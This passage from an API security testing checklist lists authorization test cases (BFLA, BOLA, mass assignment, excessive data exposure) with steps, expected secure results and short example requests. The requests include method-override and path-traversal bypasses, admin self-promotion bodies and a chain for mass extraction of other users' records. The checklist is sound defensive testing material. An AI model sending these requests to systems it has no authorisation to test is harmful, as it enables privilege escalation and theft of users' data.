**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0210 — BFLA - HTTP Method Tampering
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privileged/admin function endpoint

**Test Steps:** 1. Find endpoint that allows GET<br><br>2. Try other methods (POST, PUT, DELETE)<br><br>3. Check if method-level authorization exists<br><br>4. Perform unauthorized operations

**Expected Result:** Should validate authorization per method

**Payload / PoC Example:**

```
DELETE /api/users/1 (if only GET allowed)
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0211 — BFLA - API Version Downgrade
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privileged/admin function endpoint

**Test Steps:** 1. Access current API version<br><br>2. Change to older version (v1, v2)<br><br>3. Check if older version has weaker controls<br><br>4. Exploit missing authorization

**Expected Result:** Should apply consistent security across versions

**Payload / PoC Example:**

```
GET /api/v1/admin/users (v1 lacks auth check)
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0212 — BFLA - Internal API Exposure
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Privileged/admin function endpoint

**Test Steps:** 1. Enumerate internal endpoints<br><br>2. Access /internal/ or /private/ paths<br><br>3. Check if internal APIs exposed externally<br><br>4. Test for authentication requirements

**Expected Result:** Should not expose internal APIs externally

**Payload / PoC Example:**

```
GET /api/internal/service-config
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** DirBuster/ffuf

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0213 — BFLA - Debug Endpoint Access
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privileged/admin function endpoint

**Test Steps:** 1. Try common debug endpoints<br><br>2. Access /debug /actuator /health /metrics<br><br>3. Check for sensitive information<br><br>4. Test for unauthenticated access

**Expected Result:** Should disable or protect debug endpoints

**Payload / PoC Example:**

```
GET /actuator/env or /debug/vars
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** DirBuster/ffuf

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0214 — Delete Admin/System Resources via BFLA
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** DELETE Admin Functions — Privileged/admin function endpoint

**Test Steps:** 1. Login as regular user<br>2. Send DELETE to admin-only user management endpoints<br>3. Try deleting admin accounts, system users<br>4. Test HTTP method override to reach DELETE endpoints

**Expected Result:** Admin-only endpoints enforce role check; regular user tokens receive 403

**Payload / PoC Example:**

```
# Direct BFLA
DELETE /api/admin/users/1 HTTP/1.1
Authorization: Bearer <regular_user_token>

DELETE /api/admin/roles/1
Authorization: Bearer <regular_user_token>

# HTTP Method Override bypass
POST /api/admin/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
_method=DELETE

# BFLA via different path casing
DELETE /API/Admin/Users/1
DELETE /api/ADMIN/users/1
DELETE /api/admin/../admin/users/1  # Path traversal

# Try with blank auth
DELETE /api/admin/users/1
Authorization: Bearer 
Authorization: Bearer null
Authorization: Bearer undefined
```

**Impact:** Access to admin/privileged functions as low-priv user

**Tools:** Burp Suite, Autorize

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0215 — BFLA: self-promote to admin / create admin account as low-priv
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Privileged admin/user-management function invoked with a low-priv token

**Test Steps:** 1. As low-priv A, call privileged endpoints the UI hides<br>2. Try self role-change, create-admin, tenant-wide settings<br>3. Re-authenticate and read back to confirm the privilege persisted<br>4. Prove effect (list/modify other users)

**Expected Result:** Function-level authz blocks privileged actions for low-priv roles

**Payload / PoC Example:**

```
PUT /api/v1/users/me/roles {"roles":["admin"]}   |   POST /api/v1/admin/users {"email":"m@t.tld","role":"admin"}
```

**Impact:** Vertical priv-esc to admin / attacker-created admin account -&gt; full compromise

**Tools:** Burp Suite, method_tamper.py

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control (BFLA); OWASP API5; OWASP API Top 10; API5:2023 Broken Function Level Authorization

---

## API-0216 — CHAIN: mass-assign role -&gt; BFLA admin function -&gt; tenant takeover
**Phase:** 6-Authorization · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Registration/profile body (role) then an admin/BFLA function that trusts that role

**Test Steps:** 1. Mass-assign role/isAdmin on signup or profile update<br>2. Read back to confirm the elevated role stuck<br>3. Invoke an admin/BFLA function that trusts the role<br>4. Perform a tenant-wide action (list/modify all users)

**Expected Result:** Role is server-controlled AND admin functions independently authorize each call

**Payload / PoC Example:**

```
POST /register {"email":..,"role":"admin"}  -> GET /api/v1/admin/users -> PATCH all
```

**Impact:** Mass-assignment + BFLA chain -&gt; full tenant/org takeover

**Tools:** Burp Suite, authz_diff.py

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); REST_API TESTING_GUIDE §16 killer-chain ②; OWASP API5/API3; API5:2023 Broken Function Level Authorization

---

## API-0217 — BOLA via numeric ID enumeration
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. As userA hit /api/orders/{id}<br>2. Replay with userB's ID<br>3. Iterate range; quantify exposed records

**Expected Result:** 404/403 for non-owned IDs

**Payload / PoC Example:**

```
GET /api/orders/123
```

**Impact:** Mass PII / payment data leak

**Tools:** Burp Suite,Autorize

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0218 — BOLA via UUID v1 timestamp prediction
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Collect multiple v1 UUIDs; analyze MAC/clock fields<br>2. Predict victim UUIDs in window<br>3. Access objects

**Expected Result:** Use UUID v4 (random)

**Payload / PoC Example:**

```
GET /api/resources/550e8400-e29b-41d4-...
```

**Impact:** Cross-user data leak

**Tools:** uuid analysis tool

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0219 — BOLA in batch operations
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Send POST /batch with array containing victim IDs<br>2. Check if server validates ownership per item

**Expected Result:** Validate ownership per item

**Payload / PoC Example:**

```
{"ids":[1,2,3,VICTIM]}
```

**Impact:** Mass exfil/destroy

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0220 — BOLA via GraphQL node interface
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Use node(id:"....") query<br>2. Swap base64-encoded global ID<br>3. Read victim object

**Expected Result:** Per-resolver authz

**Payload / PoC Example:**

```
node(id:"VXNlcjoy") {... on User {email}}
```

**Impact:** GraphQL cross-user leak

**Tools:** InQL,Burp

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0221 — BOLA via JSON body ID override
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PUT Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Update own profile<br>2. Add "id":victim in body<br>3. Check whether server uses URL or body ID

**Expected Result:** Server should use authenticated context only

**Payload / PoC Example:**

```
PUT /api/profile {"id":2,"name":"Hacked"}
```

**Impact:** Cross-user data manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0222 — Create Without Authentication
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create Resource — Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Remove auth token<br>2. Send POST request to create resource<br>3. Check if created

**Expected Result:** Should return 401 Unauthorized

**Payload / PoC Example:**

```
POST /api/posts without Authorization header
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API2:2023 Broken Authentication

---

## API-0223 — JSON Array Limit
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create Resource — Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Send array with 1M+ items<br>2. Check if processed<br>3. Monitor server resources

**Expected Result:** Should limit array size

**Payload / PoC Example:**

```
POST /items {"products": [10000000 items]}
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Custom Script

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0224 — Duplicate Prevention
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Create Resource — Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Create resource with unique field<br>2. Try creating duplicate<br>3. Check validation

**Expected Result:** Should prevent duplicates based on business rules

**Payload / PoC Example:**

```
Create two items with same unique identifier
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0225 — Read Without Authentication
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read Resource — Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Remove auth token<br>2. Send GET request<br>3. Check if data returned

**Expected Result:** Should require authentication for sensitive data

**Payload / PoC Example:**

```
GET /api/profile without Authorization header
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API2:2023 Broken Authentication

---

## API-0226 — Pagination Bypass
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Read Resource — Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Request all data without pagination<br>2. Set limit=999999<br>3. Check server response

**Expected Result:** Should enforce maximum page size

**Payload / PoC Example:**

```
GET /api/users?limit=999999
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0227 — Filter/Sort Injection
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read Resource — Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Inject malicious sorting parameters<br>2. Try NoSQL/SQL in filters<br>3. Check behavior

**Expected Result:** Should validate filter parameters

**Payload / PoC Example:**

```
GET /api/posts?sort[$ne]=null
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0228 — BOLA via UUID Prediction
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Create multiple resources<br><br>2. Analyze UUID patterns<br><br>3. Predict valid UUIDs<br><br>4. Access other users' resources

**Expected Result:** Should use cryptographically random UUIDs

**Payload / PoC Example:**

```
GET /api/resources/550e8400-e29b-41d4-a716-446655440000
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Burp Intruder

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0229 — BOLA via Nested Resource Access
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Access nested resource<br><br>2. Change parent resource ID<br><br>3. Access child resources of other users<br><br>4. Check authorization

**Expected Result:** Should validate ownership at all levels

**Payload / PoC Example:**

```
GET /api/users/2/orders/1 (logged as user 1)
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0230 — BOLA via HTTP Parameter Override
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Object ID in URL path/body (e.g. /resource/{id})

**Test Steps:** 1. Access resource normally<br><br>2. Add userId parameter to URL<br><br>3. Override with different user ID<br><br>4. Check if access granted

**Expected Result:** Should ignore client-provided user identifiers

**Payload / PoC Example:**

```
GET /api/profile?userId=2
```

**Impact:** Cross-tenant object access; read/modify other users' data

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0231 — Second-order / multi-step BOLA (authz checked once then dropped)
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-step flow (export/report/share) — object ID validated in step 1 but re-used unchecked in step 2/3

**Test Steps:** 1. As user A, start a multi-step flow that references an object by ID<br>2. Confirm the ID is authorized in step 1 but NOT re-checked later<br>3. Replay step 2/3 with B's object ID using A's token<br>4. Confirm A operates on B's object (two-account proof)

**Expected Result:** Every step re-authorizes the object against the caller (not just step 1)

**Payload / PoC Example:**

```
POST /export/step1 {"objectId":<A_id>}  ->  POST /export/step2 {"objectId":<B_id>}   (A token)
```

**Impact:** Second-order BOLA: authorization enforced once then dropped -&gt; cross-user read/modify

**Tools:** Burp Suite (Repeater/Turbo Intruder), authz_diff.py

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1; disclosed multi-step IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0232 — CHAIN: ID-leak endpoint -&gt; UUID BOLA -&gt; mass read
**Phase:** 6-Authorization · **Category:** BOLA · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** List/search/notification endpoint leaking other users' UUIDs -&gt; object endpoint

**Test Steps:** 1. Find an endpoint returning other users' UUIDs (which you cannot guess)<br>2. Harvest the UUIDs<br>3. Feed each into the object endpoint with A's token<br>4. Script mass extraction; quantify scope for severity

**Expected Result:** UUIDs are not exposed cross-user AND the object endpoint re-authorizes per object

**Payload / PoC Example:**

```
GET /api/v1/search?q=*  -> collect uuids ->  GET /api/v1/users/{uuid}/card   (A token)
```

**Impact:** ID-leak weaponizes an unguessable UUID BOLA -&gt; bulk cross-user data exfiltration

**Tools:** Burp Suite, ffuf, custom script

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); REST_API TESTING_GUIDE §16 killer-chain ①; OWASP API1; PortSwigger Access Control; API1:2023 Broken Object Level Authorization

---

## API-0233 — Excessive data exposure in response
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Fetch /api/me and /api/users/{id}<br>2. Diff responses<br>3. Look for password_hash mfaSecret ssn taxId creditCard internalNotes

**Expected Result:** Filter response server-side

**Payload / PoC Example:**

```
Response includes password_hash ssn
```

**Impact:** Mass PII leak

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0234 — Mass assignment to elevate role
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PUT Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. PUT /api/profile with extras: isAdmin role permissions tenantId emailVerified<br>2. Verify access changes<br>3. Test 20+ candidate fields

**Expected Result:** Allow-list updatable fields

**Payload / PoC Example:**

```
{"isAdmin":true,"permissions":["*"]}
```

**Impact:** Privilege escalation

**Tools:** Burp Suite,Param Miner

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0235 — Mass Assignment - Modify Privileged Fields
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile Update — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Intercept profile update request<br>2. Add isAdmin/role/balance fields<br>3. Submit request

**Expected Result:** Should ignore non-updatable fields

**Payload / PoC Example:**

```
PUT /profile {"name":"John", "isAdmin":true, "accountBalance":99999}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0236 — Update Email Without Verification
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Profile Update — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Update email to new address<br>2. Check if verification required<br>3. Try using new email immediately

**Expected Result:** Should require email verification before change

**Payload / PoC Example:**

```
Change email without clicking verification link
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0237 — Update Without Authentication
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile Update — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Remove authentication token<br>2. Send profile update request<br>3. Check if processed

**Expected Result:** Should return 401 Unauthorized

**Payload / PoC Example:**

```
Send PUT /profile without Authorization header
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API2:2023 Broken Authentication

---

## API-0238 — Parameter Pollution in Update
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Profile Update — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Send duplicate parameters<br>2. Test array injection<br>3. Check which value is processed

**Expected Result:** Should handle consistently

**Payload / PoC Example:**

```
PUT /profile?userId=1&userId=2 {"name":"test"}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0239 — Mass Assignment in Creation
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create Resource — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Create resource<br>2. Add privileged fields (ownerId featured priority)<br>3. Check if accepted

**Expected Result:** Should ignore unauthorized fields

**Payload / PoC Example:**

```
POST /posts {"title":"Test", "featured":true, "ownerId":999}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0240 — Excessive Data Exposure
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read Resource — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Fetch resource<br>2. Analyze response<br>3. Check for unnecessary sensitive fields

**Expected Result:** Should only return required fields

**Payload / PoC Example:**

```
Response includes: password_hash, ssn, tokens
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0241 — Mass Assignment on Update
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Update Resource — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Update resource<br>2. Include protected fields (status approved userId)<br>3. Check if updated

**Expected Result:** Should ignore non-updatable fields

**Payload / PoC Example:**

```
PUT /posts/1 {"title":"New", "approved":true, "featured":true}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0242 — Parameter Pollution on Update
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Update Resource — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Send duplicate parameters<br>2. Check which one is processed<br>3. Test for inconsistencies

**Expected Result:** Should handle consistently

**Payload / PoC Example:**

```
PUT /posts/1?id=1&id=2 {data}
```

